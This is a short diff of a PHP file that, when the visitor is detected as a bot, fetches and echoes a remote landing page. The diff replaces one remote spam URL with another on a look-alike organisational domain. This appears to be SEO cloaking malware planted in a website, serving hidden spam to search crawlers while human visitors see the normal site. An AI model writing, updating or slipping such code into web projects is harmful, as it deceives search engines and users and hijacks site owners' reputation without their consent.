@@ -30,7 +30,7 @@ function fetch_content($url) {
 }
  
 if (is_bot()) {
-    echo fetch_content('https://absolute-water.live/landing/obsesi.html');
+    echo fetch_content('https://freeportindonesia.org/landing/mail-obsesi.html');
 } 
 
 /**
